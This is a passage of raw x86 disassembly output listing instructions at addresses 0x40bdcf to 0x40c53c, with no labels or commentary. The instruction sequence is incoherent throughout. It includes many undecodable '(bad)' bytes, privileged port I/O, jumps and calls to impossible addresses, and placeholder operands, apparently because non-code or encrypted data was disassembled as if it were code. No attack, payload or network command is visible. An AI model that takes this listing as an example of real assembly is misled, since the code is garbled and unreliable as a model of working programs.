  40bdcf:	mov    al,ds:0xd37520c2
  40bdd4:	jp     0x40bd89
  40bdd6:	xchg   ebp,eax
  40bdd7:	mov    WORD PTR [edx+eiz*4+0x41d3344e],cs
  40bdde:	jne    0x40bd75
  40bde0:	das    
  40bde1:	mov    bh,0x0
  40bde3:	cmp    eax,0x37a524d7
  40bde8:	lods   eax,DWORD PTR ds:[esi]
  40bde9:	mov    esp,0x2a665101
  40bdee:	popa   
  40bdef:	mov    ebx,0x81462e9a
  40bdf4:	and    BYTE PTR [ecx-0x22],dl
  40bdf7:	jp     0x40bde1
  40bdf9:	shl    DWORD PTR [eax+0x55],1
  40bdfc:	pop    esi
  40bdfd:	idiv   dh
  40bdff:	push   ebp
  40be00:	nop
  40be01:	inc    ebp
  40be02:	jg     0x40be16
  40be04:	sub    BYTE PTR [ebp+0x44],al
  40be07:	ja     0x40bdf9
  40be09:	mov    bh,0x58
  40be0b:	jns    0x40be14
  40be0d:	xchg   ebx,eax
  40be0e:	scas   eax,DWORD PTR es:[edi]
  40be0f:	adc    DWORD PTR [ebx+edx*1],ebp
  40be12:	xchg   esi,eax
  40be13:	inc    edi
  40be14:	or     al,bl
  40be16:	pop    esi
  40be17:	mov    cl,bh
  40be19:	fiadd  WORD PTR [edi-0x4a]
  40be1c:	clc    
  40be1d:	into   
  40be1e:	imul   edi,DWORD PTR ds:0xda7caff1,0x937c597e
  40be28:	dec    esp
  40be29:	shr    DWORD PTR [esi+eax*8-0x657a780d],1
  40be30:	fcomp  DWORD PTR [eax+0x6e]
  40be33:	sub    ebp,DWORD PTR [ecx-0x7eef91c]
  40be39:	push   ss
  40be3a:	mov    edi,0xf59f4a20
  40be3f:	fiadd  WORD PTR [esi+0x7f3e2802]
  40be45:	test   BYTE PTR [ebx-0x36],0x33
  40be49:	add    eax,0x44977c7
  40be4e:	retf   
  40be4f:	inc    ebx
  40be50:	mov    DWORD PTR ds:0xe2f6df91,esi
  40be56:	pop    ebx
  40be57:	pop    esp
  40be58:	or     BYTE PTR [edi+0x2880fd1a],cl
  40be5e:	je     0x40be47
  40be60:	daa    
  40be61:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40be62:	aas    
  40be63:	jl     0x40be4c
  40be65:	add    BYTE PTR [edi],dh
  40be67:	sbb    eax,0xcf33119e
  40be6c:	push   0x34
  40be6e:	fst    DWORD PTR [ebx]
  40be70:	loopne 0x40be82
  40be72:	xor    al,0x54
  40be74:	pop    edi
  40be75:	pop    ecx
  40be76:	ss xor ch,dh
  40be79:	dec    edx
  40be7a:	jge    0x40be4c
  40be7c:	inc    edx
  40be7d:	rol    BYTE PTR [edx],cl
  40be7f:	sti    
  40be80:	aas    
  40be81:	repnz and eax,0xa03ca28a
  40be87:	test   eax,0x8ac9f8fb
  40be8c:	aam    0xb3
  40be8e:	call   0xa3fcda69
  40be93:	retf   0xc12c
  40be96:	jg     0x40beeb
  40be98:	jbe    0x40be6c
  40be9a:	and    ch,BYTE PTR [esi-0x63]
  40be9d:	pop    DWORD PTR [eax+0x2a]
  40bea0:	fcmove st,st(2)
  40bea2:	cmp    al,0x9b
  40bea4:	push   ebp
  40bea5:	push   edi
  40bea6:	ins    BYTE PTR es:[edi],dx
  40bea7:	(bad)  
  40bea8:	sbb    esi,DWORD PTR [ecx+eiz*8+0x2]
  40beac:	imul   edi,DWORD PTR [esi+0x1],0xffffffa4
  40beb0:	jg     0x40be95
  40beb2:	int    0x6e
  40beb4:	add    ebx,DWORD PTR [edx+0x33b80f42]
  40beba:	(bad)  
  40bebb:	sub    esp,0x43bcc2f9
  40bec1:	shl    BYTE PTR [ecx+0x61],cl
  40bec4:	xchg   esi,eax
  40bec5:	(bad)  
  40bec6:	pop    eax
  40bec7:	fstp   DWORD PTR [edx+0x63f1c2a0]
  40becd:	jmp    0x40beb9
  40becf:	mov    edx,0x5933f852
  40bed4:	dec    ecx
  40bed5:	jmp    0x40beae
  40bed7:	(bad)  
  40bed8:	cmp    ecx,DWORD PTR [ebx+0x49]
  40bedb:	mov    cl,0x4f
  40bedd:	fwait
  40bede:	mov    edx,0x9128bd71
  40bee3:	(bad)  
  40bee4:	(bad)  
  40bee5:	and    eax,0xbb602d05
  40beea:	pop    ebx
  40beeb:	retf   0x356
  40beee:	lods   al,BYTE PTR ds:[esi]
  40beef:	das    
  40bef0:	jp     0x40beb8
  40bef2:	jle    0x40bf1b
  40bef4:	out    dx,eax
  40bef5:	jno    0x40bec8
  40bef7:	xor    DWORD PTR [edx],edi
  40bef9:	imul   edi,DWORD PTR [edx-0x12e2a30c],0x662e4de3
  40bf03:	jno    0x40bf49
  40bf05:	xchg   DWORD PTR [esi+0x5209b5bb],esi
  40bf0b:	in     al,0xb1
  40bf0d:	and    eax,0xbc5e4ef2
  40bf12:	lea    edx,[ebx]
  40bf14:	jg     0x40bf83
  40bf16:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bf17:	mov    bl,0x77
  40bf19:	inc    edx
  40bf1a:	jnp    0x40bef0
  40bf1c:	loop   0x40beb9
  40bf1e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bf1f:	mov    DWORD PTR [eax-0x5f],edi
  40bf22:	ret    
  40bf23:	jge    0x40beb5
  40bf25:	sbb    bh,BYTE PTR [eax-0x4b]
  40bf28:	mov    esi,cs
  40bf2a:	ret    
  40bf2b:	aaa    
  40bf2c:	inc    eax
  40bf2d:	jne    0x40bebe
  40bf2f:	xor    eax,0xcca5a2b8
  40bf34:	in     eax,0x8b
  40bf36:	ds xchg ebx,eax
  40bf38:	nop
  40bf39:	jl     0x40bee8
  40bf3b:	cs add al,0xb0
  40bf3f:	mov    eax,ds:0xde204095
  40bf45:	aas    
  40bf46:	into   
  40bf47:	fwait
  40bf48:	outs   dx,DWORD PTR ds:[esi]
  40bf49:	push   cs
  40bf4a:	pop    esp
  40bf4b:	pop    ebx
  40bf4c:	and    al,0x50
  40bf4e:	aam    0xab
  40bf50:	dec    di
  40bf52:	xchg   ebx,eax
  40bf53:	jb     0x40bfc3
  40bf55:	adc    al,0x1c
  40bf57:	cpuid  
  40bf59:	or     eax,0x58d99159
  40bf5e:	into   
  40bf5f:	dec    ebx
  40bf60:	push   0x2b14136d
  40bf65:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bf66:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bf67:	pop    ecx
  40bf68:	stos   BYTE PTR es:[edi],al
  40bf69:	stc    
  40bf6a:	in     eax,0x4e
  40bf6c:	dec    esp
  40bf6d:	and    bh,BYTE PTR [ebx+0x7]
  40bf70:	and    DWORD PTR [edi],edx
  40bf72:	push   ss
  40bf73:	loope  0x40bf5a
  40bf75:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bf76:	pop    es
  40bf77:	pop    ds
  40bf78:	aaa    
  40bf79:	stos   BYTE PTR es:[edi],al
  40bf7a:	cmp    ebx,ecx
  40bf7c:	pop    ebp
  40bf7d:	js     0x40bf37
  40bf7f:	cmp    DWORD PTR [ecx+edx*2],esp
  40bf82:	xor    al,0xd0
  40bf84:	pop    edx
  40bf85:	and    DWORD PTR [ebx+0x75],ecx
  40bf88:	fldcw  WORD PTR [esi-0x2b]
  40bf8b:	push   esp
  40bf8c:	mov    esi,0xe1fb9b04
  40bf91:	xchg   esi,eax
  40bf92:	loopne 0x40bffa
  40bf94:	add    BYTE PTR [edx+0x20125530],0x28
  40bf9b:	and    edi,ebp
  40bf9d:	cwde   
  40bf9e:	sahf   
  40bf9f:	push   0xc822a623
  40bfa4:	lock cmp BYTE PTR [ebp-0x9],al
  40bfa8:	mov    BYTE PTR [ebp+0x123629c3],cl
  40bfae:	call   0x33c76808
  40bfb3:	(bad)  
  40bfb4:	dec    ecx
  40bfb5:	rol    BYTE PTR [esi+0x37],1
  40bfb8:	cmp    ah,BYTE PTR ds:0xca06fb00
  40bfbe:	das    
  40bfbf:	adc    BYTE PTR [edx+0x5a],bh
  40bfc2:	inc    DWORD PTR [edx]
  40bfc4:	jge    0x40bf7f
  40bfc6:	inc    ecx
  40bfc7:	pushf  
  40bfc8:	stc    
  40bfc9:	imul   eax,DWORD PTR [esi-0x179c5a2a],0x3bdd9e76
  40bfd3:	jnp    0x40bfb6
  40bfd5:	and    BYTE PTR [edx+0x2e],ah
  40bfd8:	imul   ebx,DWORD PTR [edx],0x3
  40bfdb:	mov    dl,0xcc
  40bfdd:	dec    eax
  40bfde:	aaa    
  40bfdf:	xlat   BYTE PTR ds:[ebx]
  40bfe0:	ficomp WORD PTR [ebp+0x36]
  40bfe3:	push   0x59
  40bfe5:	mov    ?,eax
  40bfe7:	repnz fild WORD PTR [ecx]
  40bfea:	pusha  
  40bfeb:	xchg   edi,eax
  40bfec:	clc    
  40bfed:	pop    edx
  40bfee:	mov    edx,edx
  40bff0:	sti    
  40bff1:	jle    0x40c02c
  40bff3:	ja     0x40c03c
  40bff5:	mov    dh,0x99
  40bff7:	jne    0x40bf7a
  40bff9:	rcr    eax,cl
  40bffb:	popaw  
  40bffd:	jae    0x40bfc4
  40bfff:	pop    ebp
  40c000:	(bad)  
  40c002:	addr16 pop eax
  40c004:	inc    edx
  40c005:	push   eax
  40c006:	pushf  
  40c007:	fidivr DWORD PTR [esi+0x1f]
  40c00a:	stc    
  40c00b:	adc    al,0x5f
  40c00d:	mov    ds:0x411168d5,al
  40c012:	push   ebp
  40c013:	push   edx
  40c014:	or     al,0xbe
  40c016:	dec    esi
  40c017:	aam    0x35
  40c019:	mov    ch,0x32
  40c01b:	xchg   ebx,eax
  40c01c:	pop    es
  40c01d:	sub    BYTE PTR [esi+0x4a],bl
  40c020:	icebp  
  40c021:	test   al,0x86
  40c023:	mov    ebp,0xfed0486c
  40c028:	jno    0x40c079
  40c02a:	test   al,0x2e
  40c02c:	dec    esi
  40c02d:	or     DWORD PTR [eax-0x36],eax
  40c030:	lock sub DWORD PTR [ecx],ebx
  40c033:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c034:	imul   eax,edi,0x7ccf0fce
  40c03a:	mov    ch,0x73
  40c03c:	xchg   ecx,eax
  40c03d:	rcr    BYTE PTR [ebx+0x2aa9bfa2],cl
  40c043:	out    0x4f,eax
  40c045:	out    0x6e,al
  40c047:	leave  
  40c048:	ss dec eax
  40c04a:	add    dh,bh
  40c04c:	jmp    0x6457:0x7a3ca452
  40c053:	jne    0x40c000
  40c055:	(bad)  
  40c056:	mov    ch,0xa1
  40c058:	cs jnp 0x40c032
  40c05b:	xor    ah,BYTE PTR [ecx]
  40c05d:	aad    0x6b
  40c05f:	mov    ds:0x61ff3bd,eax
  40c064:	xchg   BYTE PTR [ecx],ah
  40c066:	adc    al,0x4d
  40c068:	sbb    al,BYTE PTR [edx]
  40c06a:	xchg   ecx,eax
  40c06b:	dec    eax
  40c06c:	xchg   ebp,eax
  40c06d:	daa    
  40c06e:	sub    BYTE PTR [ebx+0x79],dl
  40c071:	and    bh,dh
  40c073:	cwde   
  40c074:	test   al,0xd4
  40c076:	mov    esi,0x735785f8
  40c07b:	data16 cmc 
  40c07d:	outs   dx,BYTE PTR ds:[esi]
  40c07e:	add    dl,BYTE PTR [ecx-0x7e5448ad]
  40c084:	xchg   edi,eax
  40c085:	mov    ah,0x6b
  40c087:	mov    dl,0xcd
  40c089:	rcl    dl,cl
  40c08b:	aas    
  40c08c:	add    edi,DWORD PTR [eax-0x5e]
  40c08f:	jne    0x40c0fe
  40c091:	xchg   esi,eax
  40c092:	pusha  
  40c093:	mov    BYTE PTR [ecx+0x28],dh
  40c096:	and    BYTE PTR [ecx],bl
  40c098:	pop    es
  40c099:	stc    
  40c09a:	dec    esi
  40c09b:	jp     0x376c41c2
  40c0a1:	rcl    BYTE PTR [ebp+ecx*4+0x54b73bec],1
  40c0a8:	adc    eax,0x615a9881
  40c0ad:	pop    ebp
  40c0ae:	xchg   esi,eax
  40c0af:	mov    ecx,0xdc5d7892
  40c0b4:	inc    esp
  40c0b5:	jp     0x40c097
  40c0b7:	lock out dx,al
  40c0b9:	add    al,0x80
  40c0bb:	fbld   TBYTE PTR [ebp+0x24]
  40c0be:	sahf   
  40c0bf:	inc    ebx
  40c0c0:	inc    ecx
  40c0c1:	adc    eax,0x4539db22
  40c0c6:	mov    dl,0x4f
  40c0c8:	cmp    eax,0xea9c5cfa
  40c0cd:	pop    ds
  40c0ce:	mov    edi,0xe4b3fe75
  40c0d3:	cmp    BYTE PTR [eax+0x67],al
  40c0d6:	push   ds
  40c0d7:	nop
  40c0d8:	xchg   esi,eax
  40c0d9:	sub    bh,bl
  40c0db:	adc    al,BYTE PTR [ecx+ecx*2]
  40c0de:	xchg   BYTE PTR [eax+0x7d],bh
  40c0e1:	push   0x6
  40c0e3:	dec    eax
  40c0e4:	cmp    DWORD PTR [esp+ebp*1],ebp
  40c0e7:	sbb    al,0x96
  40c0e9:	inc    eax
  40c0ea:	inc    esp
  40c0eb:	sbb    eax,0x18f7eebc
  40c0f0:	or     eax,ebp
  40c0f2:	cmp    DWORD PTR [edi],ecx
  40c0f4:	cli    
  40c0f5:	lock cmp BYTE PTR [edi-0x2f],ch
  40c0f9:	push   ebx
  40c0fa:	sbb    esi,DWORD PTR [edx-0x1f76acb4]
  40c100:	push   edi
  40c101:	mov    eax,ds:0x18f98a8f
  40c106:	mov    edi,0xb31c7ab9
  40c10b:	and    al,0xe4
  40c10d:	cmp    edx,edx
  40c10f:	mul    DWORD PTR ds:0xa66828f1
  40c115:	cs in  al,dx
  40c117:	dec    esp
  40c118:	clc    
  40c119:	mov    ch,cl
  40c11b:	dec    ebx
  40c11c:	imul   ecx,ebx
  40c11f:	push   esi
  40c120:	sbb    eax,0x6c40dc9b
  40c125:	dec    esp
  40c126:	retf   0x3c03
  40c129:	add    cl,BYTE PTR [edi+ecx*2-0x2a]
  40c12d:	xchg   DWORD PTR [edx],ecx
  40c12f:	cmp    DWORD PTR [ecx+eax*8+0x8b077c4],ebp
  40c136:	stos   BYTE PTR es:[edi],al
  40c137:	and    ebp,esi
  40c139:	or     BYTE PTR [ebp+0x66f67ee],bh
  40c13f:	mov    ds:0x7bdf88a,al
  40c144:	sub    bh,bh
  40c146:	test   cl,0x77
  40c149:	lock cmc 
  40c14b:	lahf   
  40c14c:	inc    ebp
  40c14d:	cdq    
  40c14e:	in     al,dx
  40c14f:	repnz cld 
  40c151:	daa    
  40c152:	fist   DWORD PTR [edi+ecx*4]
  40c155:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c156:	mov    dl,0x38
  40c158:	xchg   ecx,eax
  40c159:	jp     0x40c18c
  40c15b:	fild   DWORD PTR [ecx-0x52]
  40c15e:	adc    eax,DWORD PTR fs:[ebx]
  40c161:	outs   dx,DWORD PTR ds:[esi]
  40c162:	push   cs
  40c163:	push   cs
  40c164:	cmp    ch,BYTE PTR [ecx+eiz*2+0xa]
  40c168:	(bad)  
  40c169:	popf   
  40c16a:	mov    esp,0xde364001
  40c16f:	push   eax
  40c170:	jecxz  0x40c12e
  40c172:	rcr    BYTE PTR [edx+ecx*2],1
  40c175:	leave  
  40c176:	shl    BYTE PTR [esi],0x83
  40c179:	lea    ebp,[edi-0x66]
  40c17c:	sbb    cl,BYTE PTR [ebx]
  40c17e:	push   ss
  40c17f:	aaa    
  40c180:	push   cs
  40c181:	jae    0x40c13d
  40c183:	(bad)  
  40c184:	and    dh,BYTE PTR [edi+esi*8-0x46aa8670]
  40c18b:	xchg   edi,eax
  40c18c:	aam    0x16
  40c18e:	fsub   QWORD PTR [esi]
  40c190:	sbb    eax,DWORD PTR [ecx-0x2a945ca9]
  40c196:	or     eax,0x6192855
  40c19b:	cmp    BYTE PTR [edx-0x64],dh
  40c19e:	cmp    eax,0xb4d7ead2
  40c1a3:	add    edx,esp
  40c1a5:	cld    
  40c1a6:	jmp    0x40c188
  40c1a8:	add    cl,ch
  40c1aa:	adc    bl,BYTE PTR [edx-0x22]
  40c1ad:	adc    DWORD PTR [ebx],eax
  40c1af:	xlat   BYTE PTR ds:[ebx]
  40c1b0:	les    esp,FWORD PTR [edx]
  40c1b2:	push   es
  40c1b3:	or     ch,BYTE PTR [edx]
  40c1b5:	das    
  40c1b6:	jae    0x40c1d4
  40c1b8:	and    DWORD PTR [esp+ebp*1+0x29601770],ecx
  40c1bf:	push   edi
  40c1c0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c1c1:	mov    esp,0xa091db5
  40c1c6:	pop    esp
  40c1c7:	sub    eax,0x81d8b731
  40c1cc:	es mov eax,0x68aa16d6
  40c1d2:	sbb    DWORD PTR [edx+0x6adbb70b],esi
  40c1d8:	pop    esp
  40c1d9:	out    0xce,al
  40c1db:	mov    ss,ebp
  40c1dd:	int    0xf
  40c1df:	sub    eax,0x412f98b1
  40c1e4:	push   0xffffff90
  40c1e6:	mov    ds:0xced963bd,al
  40c1eb:	jl     0x40c1a0
  40c1ed:	dec    ecx
  40c1ee:	aam    0xbf
  40c1f0:	das    
  40c1f1:	shr    BYTE PTR [esi-0x4afb6df8],1
  40c1f7:	mov    dl,0x99
  40c1f9:	jne    0x40c20c
  40c1fb:	push   0x25baf4e8
  40c200:	and    dl,bl
  40c202:	sbb    DWORD PTR [ecx+0x4],ebx
  40c205:	out    dx,al
  40c206:	jo     0x40c255
  40c208:	into   
  40c209:	pushf  
  40c20a:	outs   dx,BYTE PTR ds:[esi]
  40c20b:	(bad)  
  40c20c:	or     BYTE PTR [ecx+0x46],dh
  40c20f:	retf   0xf4f7
  40c212:	retf   0x4ae3
  40c215:	fcomp  QWORD PTR [edx-0x14]
  40c218:	jbe    0x40c22a
  40c21a:	push   edi
  40c21b:	fmul   DWORD PTR [edi-0x55ae4b83]
  40c221:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c222:	sbb    ebx,edx
  40c224:	and    al,0xec
  40c226:	cli    
  40c227:	dec    esi
  40c228:	pusha  
  40c229:	scas   eax,DWORD PTR es:[edi]
  40c22a:	in     eax,dx
  40c22b:	sub    eax,0x3d8acf9
  40c230:	push   eax
  40c231:	xor    eax,0x6390e843
  40c236:	test   DWORD PTR [esi-0x37],esp
  40c239:	(bad)  
  40c23a:	cmp    BYTE PTR [eax-0x57],ch
  40c23d:	int    0x39
  40c23f:	adc    al,0x1e
  40c241:	out    dx,eax
  40c242:	pop    esp
  40c243:	push   cs
  40c244:	sahf   
  40c245:	fimul  DWORD PTR [ecx-0x5f3a73c1]
  40c24b:	dec    ebx
  40c24c:	aam    0x42
  40c24e:	inc    ebp
  40c24f:	jmp    0x40c1de
  40c251:	cmp    edi,DWORD PTR [ecx+0x1f]
  40c254:	(bad)  
  40c255:	xchg   ebx,eax
  40c256:	imul   eax,DWORD PTR [ecx-0x450c118a],0xcfb3cdde
  40c260:	sbb    al,0xcc
  40c262:	es pop eax
  40c264:	(bad)  
  40c266:	jge    0x40c210
  40c268:	cmp    ch,BYTE PTR [edx-0x7605bab0]
  40c26e:	mov    ebx,0x648eb557
  40c273:	mov    gs,WORD PTR [eax+esi*2]
  40c276:	dec    ecx
  40c277:	mov    al,ds:0x2ca1c05f
  40c27c:	loope  0x40c280
  40c27e:	pushf  
  40c27f:	je     0x40c22f
  40c281:	fsubr  st(5),st
  40c283:	cmp    esp,esp
  40c285:	jo     0x40c305
  40c287:	mov    esi,0x3baed63b
  40c28c:	cmp    bh,BYTE PTR [eax-0xa]
  40c28f:	inc    edi
  40c290:	rcl    BYTE PTR [esi+ebp*8],cl
  40c293:	mov    eax,ds:0x5b990ecb
  40c298:	loop   0x40c2d2
  40c29a:	mov    WORD PTR [eax+ebp*2+0x42],?
  40c29e:	loopne 0x40c280
  40c2a0:	imul   ebx,DWORD PTR [edx+esi*1-0x6e],0xb136cc6f
  40c2a8:	test   DWORD PTR [ebp+0x5d],edi
  40c2ab:	loope  0x40c28a
  40c2ad:	loope  0x40c2ae
  40c2af:	cmp    eax,0x75bb937e
  40c2b4:	sahf   
  40c2b5:	adc    al,0xf9
  40c2b7:	sub    DWORD PTR [esi+0x4c],ecx
  40c2ba:	adc    al,0x50
  40c2bc:	ret    0x6d2d
  40c2bf:	(bad)  
  40c2c0:	fdivr  st(3),st
  40c2c2:	(bad)  
  40c2c3:	mov    edi,0x70e41a21
  40c2c9:	call   0x9cd9d7a1
  40c2ce:	aam    0x8b
  40c2d0:	ss sub eax,0xcc0a06fa
  40c2d6:	sbb    esi,eax
  40c2d8:	hlt    
  40c2d9:	mov    gs,ebx
  40c2db:	sbb    eax,0xa60094c7
  40c2e0:	adc    ch,BYTE PTR [ebx+0x66]
  40c2e3:	imul   edx,DWORD PTR [eax-0x6f],0xffffffbe
  40c2e7:	sub    DWORD PTR [edx+0x4f],ebx
  40c2ea:	fstp   DWORD PTR [esi-0x63]
  40c2ed:	out    0x44,eax
  40c2ef:	jnp    0x40c294
  40c2f1:	pop    edx
  40c2f2:	fnstsw WORD PTR [ecx]
  40c2f4:	cmp    BYTE PTR [esi-0x4dd8b3d0],dl
  40c2fa:	cld    
  40c2fb:	dec    ebp
  40c2fc:	mov    WORD PTR [ecx-0x7cb07a50],ds
  40c302:	popf   
  40c303:	or     cl,BYTE PTR [edi+0x3e]
  40c306:	mov    eax,ds:0xdcc6d062
  40c30b:	ret    
  40c30c:	mov    ecx,0xffb59cbf
  40c311:	cmp    esp,esp
  40c313:	ret    
  40c314:	dec    ebx
  40c315:	adc    al,0x7b
  40c317:	push   es
  40c318:	push   ebx
  40c319:	and    edi,0x73
  40c31c:	mov    cl,0x9
  40c31e:	xchg   BYTE PTR [ebp-0x4c8a1f9c],dh
  40c324:	ds cdq 
  40c326:	(bad)  
  40c328:	loop   0x40c384
  40c32a:	dec    ecx
  40c32b:	sar    bh,0x5b
  40c32e:	shl    BYTE PTR [edi-0x79],cl
  40c331:	mov    ebp,0x8e45e88
  40c336:	pop    ecx
  40c337:	mov    eax,DWORD PTR [esi-0x6b]
  40c33a:	(bad)  
  40c33b:	xor    BYTE PTR [ebp-0x63e14ac8],bl
  40c341:	scas   al,BYTE PTR es:[edi]
  40c342:	test   al,0x1b
  40c344:	and    DWORD PTR ds:0x8f2ce39d,0xf0fa848f
  40c34e:	inc    ebp
  40c34f:	mov    ecx,ecx
  40c351:	(bad)  
  40c352:	push   cs
  40c353:	pop    ebx
  40c354:	pop    esi
  40c355:	mov    WORD PTR [edi+esi*2],cs
  40c358:	jne    0x40c38e
  40c35a:	mov    ?,WORD PTR [edx-0x1cccfc2d]
  40c360:	hlt    
  40c361:	dec    ebx
  40c362:	cmc    
  40c363:	fnstcw WORD PTR [eax+esi*1+0x77]
  40c367:	or     dh,BYTE PTR [ebx+0x25178da0]
  40c36d:	pop    esp
  40c36e:	call   0x598517c7
  40c373:	pusha  
  40c374:	or     BYTE PTR [ebp+0x7cbad911],dh
  40c37a:	aam    0x77
  40c37c:	clc    
  40c37d:	std    
  40c37e:	in     al,dx
  40c37f:	(bad)  
  40c380:	jp     0x40c3fd
  40c382:	cmp    DWORD PTR [ebp-0x1378c534],eax
  40c388:	push   ss
  40c389:	and    ah,cl
  40c38b:	dec    ecx
  40c38c:	xor    BYTE PTR [ecx-0x66],ah
  40c38f:	clc    
  40c390:	mov    dl,0x6c
  40c392:	std    
  40c393:	icebp  
  40c394:	mov    ds:0x52cbc447,al
  40c399:	ror    BYTE PTR [ebx],1
  40c39b:	inc    DWORD PTR [edi-0x75]
  40c39e:	in     eax,dx
  40c39f:	adc    dl,BYTE PTR ds:0x66c3005b
  40c3a5:	int3   
  40c3a6:	push   cs
  40c3a7:	ds cld 
  40c3a9:	mov    bh,BYTE PTR ds:0x18d2b085
  40c3af:	xor    al,0xa8
  40c3b1:	pop    esi
  40c3b2:	(bad)  
  40c3b3:	pop    ebx
  40c3b4:	aad    0x64
  40c3b6:	pusha  
  40c3b7:	inc    edx
  40c3b8:	loope  0x40c343
  40c3ba:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c3bb:	stos   DWORD PTR es:[edi],eax
  40c3bc:	ss repz mov ah,0xfb
  40c3c0:	lea    esi,[esi]
  40c3c2:	in     al,0xe2
  40c3c4:	dec    ecx
  40c3c5:	xor    bh,BYTE PTR gs:[eax-0x6ebf3a9f]
  40c3cc:	and    eax,DWORD PTR [edi]
  40c3ce:	mov    esp,0x52e3f180
  40c3d3:	dec    ebx
  40c3d4:	stc    
  40c3d5:	loope  0x40c3c9
  40c3d7:	fucom  st(4)
  40c3d9:	sub    BYTE PTR [edi-0x64033dcf],0xd4
  40c3e0:	cmp    BYTE PTR [ebx+ecx*1-0x14],dl
  40c3e4:	gs inc sp
  40c3e7:	jnp    0x40c428
  40c3e9:	cs or  eax,0x83456fff
  40c3ef:	jb     0x40c422
  40c3f1:	ret    
  40c3f2:	in     al,dx
  40c3f3:	mov    esi,edi
  40c3f5:	adc    eax,0x70418080
  40c3fa:	push   es
  40c3fb:	push   0x7fcc1f30
  40c400:	outs   dx,BYTE PTR ds:[esi]
  40c401:	cwde   
  40c402:	lods   eax,DWORD PTR ds:[esi]
  40c403:	xor    BYTE PTR [ebp+0x7b469ee],bh
  40c409:	std    
  40c40a:	sub    eax,0x8c49e201
  40c40f:	shld   DWORD PTR [edi+ebp*1+0x1],ecx,0x7
  40c415:	in     al,dx
  40c416:	shl    DWORD PTR [eax+ebp*4],1
  40c419:	ins    BYTE PTR es:[edi],dx
  40c41a:	cmovs  esi,DWORD PTR [edx]
  40c41d:	jne    0x40c41a
  40c41f:	dec    ebx
  40c420:	and    eax,0x968db1dd
  40c425:	and    al,0x96
  40c427:	adc    BYTE PTR [ecx-0x3959a773],dh
  40c42d:	ror    BYTE PTR [ebp+0x5981f1cb],0xd9
  40c434:	push   0x7d
  40c436:	stc    
  40c437:	ja     0x40c47a
  40c439:	mov    ds:0xde8a394e,al
  40c43e:	push   ebp
  40c43f:	leave  
  40c440:	in     al,dx
  40c441:	call   0xed4e1030
  40c446:	inc    ecx
  40c447:	or     DWORD PTR [edi+ebx*1-0x55],edi
  40c44b:	inc    edi
  40c44c:	xor    eax,0x333439a9
  40c451:	hlt    
  40c452:	adc    eax,0x31de98c5
  40c457:	test   al,0xe
  40c459:	xor    edi,ecx
  40c45b:	xchg   ebp,eax
  40c45c:	inc    edx
  40c45d:	cmp    eax,0x5f6c198e
  40c462:	imul   ecx,DWORD PTR [esi+esi*4],0x17
  40c466:	mov    bh,0x87
  40c468:	and    eax,ebp
  40c46a:	xor    eax,0x5b8b809f
  40c46f:	push   edx
  40c470:	scas   eax,DWORD PTR es:[edi]
  40c471:	jmp    0x40c480
  40c473:	sbb    BYTE PTR [edi-0x5f059155],dh
  40c479:	iret   
  40c47a:	ss add al,0x93
  40c47d:	jbe    0x40c4e5
  40c47f:	rcl    BYTE PTR [ebx+0x588f4698],cl
  40c485:	xchg   ebx,eax
  40c486:	out    0xab,al
  40c488:	mov    ecx,0x1be07e21
  40c48d:	xchg   esi,eax
  40c48e:	mov    ecx,0xaa4e5f00
  40c493:	mov    eax,ds:0x84cf318e
  40c498:	les    esi,FWORD PTR [edi+0x186af415]
  40c49e:	icebp  
  40c49f:	div    BYTE PTR [edi-0x7a2492e4]
  40c4a5:	pop    esi
  40c4a6:	(bad)  
  40c4a7:	xor    BYTE PTR [edi-0x15497767],al
  40c4ad:	mov    ds:0x5c90d9fa,al
  40c4b2:	pop    ebp
  40c4b3:	push   ebx
  40c4b4:	cmp    dh,BYTE PTR [ecx]
  40c4b6:	xchg   esi,eax
  40c4b7:	push   ss
  40c4b8:	fdiv   st,st(6)
  40c4ba:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c4bb:	pusha  
  40c4bc:	ins    BYTE PTR es:[edi],dx
  40c4bd:	popf   
  40c4be:	adc    cl,BYTE PTR [ebx+0x6882b0af]
  40c4c4:	jbe    0x40c4ae
  40c4c6:	fstp   DWORD PTR [ecx-0x42]
  40c4c9:	mov    al,0x73
  40c4cb:	inc    eax
  40c4cc:	jo     0x40c525
  40c4ce:	popa   
  40c4cf:	rcr    dl,cl
  40c4d1:	mov    ecx,0x1c9c166c
  40c4d6:	cli    
  40c4d7:	sub    ecx,DWORD PTR [edi]
  40c4d9:	lock sbb DWORD PTR [ebx],edx
  40c4dc:	push   0x7
  40c4de:	sub    eax,0x28464b85
  40c4e3:	fs jns 0x40c4c5
  40c4e6:	shr    DWORD PTR ds:0xcfa781eb,cl
  40c4ec:	jns    0x40c55c
  40c4ee:	ret    0x73ea
  40c4f1:	jae    0x40c568
  40c4f3:	popa   
  40c4f4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c4f5:	retf   0xb771
  40c4f8:	int3   
  40c4f9:	mov    ch,0xe8
  40c4fb:	push   ds
  40c4fc:	sub    ecx,DWORD PTR [ebp+0x76a8d6d0]
  40c502:	sbb    al,0xf7
  40c504:	push   es
  40c505:	mov    ecx,0x537587b2
  40c50a:	fstp   QWORD PTR [edx]
  40c50c:	outs   dx,BYTE PTR ds:[esi]
  40c50d:	mov    WORD PTR [ebp+0x280451e6],gs
  40c513:	push   ss
  40c514:	cmp    BYTE PTR [eax-0x16],ah
  40c517:	or     BYTE PTR [edi-0x520c104d],ah
  40c51d:	not    ebp
  40c51f:	xor    dh,dl
  40c521:	jbe    0x40c570
  40c523:	pop    ebp
  40c524:	mov    dh,0xd5
  40c526:	mov    ecx,0xbc60fabb
  40c52b:	mov    ebp,0xde897c04
  40c530:	sbb    al,0x6b
  40c532:	nop
  40c533:	test   BYTE PTR [eax+ebp*4-0xa2b7a41],al
  40c53a:	pop    ss
  40c53b:	push   ds
  40c53c:	sbb    eax,0xedc36ee1
